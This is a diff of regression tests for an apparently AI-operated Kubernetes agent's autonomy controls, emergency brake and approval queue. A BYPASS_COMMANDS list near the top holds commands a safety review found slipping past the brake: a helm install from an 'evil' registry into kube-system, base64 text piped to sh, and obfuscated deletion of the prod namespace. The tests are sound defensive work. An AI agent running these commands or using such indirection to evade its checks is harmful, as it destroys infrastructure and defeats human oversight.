@@ -22,11 +22,58 @@ def _engine(level=1, grants=()):
 STAGING = AutopilotGrant(name="staging-autopilot", namespaces=["staging"])
 
 
+# Verbatim from the 2026-08-22 safety review: each of these returned ALLOW
+# with the emergency brake engaged.
+BYPASS_COMMANDS = [
+    "kubectl apply -f - -n kube-system",
+    "helm upgrade oci://evil/chart -n kube-system",
+    "echo <b64>|base64 -d|sh",
+    "K=kubectl; $K delete ns prod",
+    "echo a3ViZWN0bCBkZWxldGUgbnMgcHJvZAo=|base64 -d|sh",
+]
+
+
 class TestObserveMode:
     def test_level0_refuses_mutations(self):
         eng = _engine(level=0)
         d = eng.decide("kubectl delete pod x -n staging", "kubectl", RiskLevel.HIGH, True)
         assert d is AutonomyDecision.REFUSE
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
+    def test_level0_refuses_review_bypasses(self, cmd):
+        """Observe mode keys off is_mutating, so a command that never asked
+        for approval still stops at the brake."""
+        eng = _engine(level=0)
+        assert eng.decide(cmd, "kubectl", RiskLevel.LOW, False) is AutonomyDecision.REFUSE
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
+    def test_brake_refuses_review_bypasses(self, cmd):
+        eng = _engine(level=1)
+        eng.set_brake("emergency-stop")
+        assert eng.decide(cmd, "kubectl", RiskLevel.LOW, False) is AutonomyDecision.REFUSE
+
+    def test_negative_level_does_not_disable_observe(self, monkeypatch):
+        """AUTONOMY_LEVEL=-1 used to clear observe mode entirely."""
+        import pydantic
+
+        from kopilot.config import Settings, reset_settings
+
+        monkeypatch.setenv("AUTONOMY_LEVEL", "-1")
+        reset_settings()
+        with pytest.raises(pydantic.ValidationError):
+            Settings()
+        reset_settings()
+
+    def test_level_above_two_is_rejected(self, monkeypatch):
+        import pydantic
+
+        from kopilot.config import Settings, reset_settings
+
+        monkeypatch.setenv("AUTONOMY_LEVEL", "3")
+        reset_settings()
+        with pytest.raises(pydantic.ValidationError):
+            Settings()
+        reset_settings()
 
     def test_level0_allows_reads(self):
         eng = _engine(level=0)
@@ -169,3 +216,45 @@ class TestExecutorIntegration:
 
         result = await run_kubectl.ainvoke({"command": "kubectl get pods -n staging"})
         assert "mocked output" in result
+
+
+@pytest.mark.asyncio
+class TestReviewBypassesAtTheExecutor:
+    """End-to-end proof for the five commands the safety review got through.
+
+    Level 0 (emergency brake) must refuse them; level 1 must stop them and
+    demand a human — outright for the two aimed at kube-system, via the
+    approval queue for the three that hide behind shell indirection.
+    """
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
+    async def test_refused_at_level_zero(self, cmd, mock_subprocess, autonomy_observe):
+        from kopilot.executor.middleware import run_shell
+
+        result = await run_shell.ainvoke({"command": cmd})
+        assert "OBSERVE MODE" in result, result
+        assert "mocked output" not in result
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS)
+    async def test_never_executes_at_level_one(self, cmd, mock_subprocess):
+        from kopilot.executor.middleware import run_shell
+
+        result = await run_shell.ainvoke({"command": cmd})
+        assert "mocked output" not in result, result
+        assert "APPROVAL REQUIRED" in result or "BLOCKED" in result, result
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS[:2])
+    async def test_protected_namespace_bypasses_blocked(self, cmd, mock_subprocess):
+        from kopilot.executor.middleware import run_shell
+
+        result = await run_shell.ainvoke({"command": cmd})
+        assert "BLOCKED (critical)" in result, result
+
+    @pytest.mark.parametrize("cmd", BYPASS_COMMANDS[2:])
+    async def test_shell_indirection_bypasses_need_approval(self, cmd, mock_subprocess):
+        from kopilot.executor.approvals import get_approval_store
+        from kopilot.executor.middleware import run_shell
+
+        result = await run_shell.ainvoke({"command": cmd})
+        assert "APPROVAL REQUIRED" in result, result
+        assert any(r.status.value == "pending" for r in get_approval_store().list())
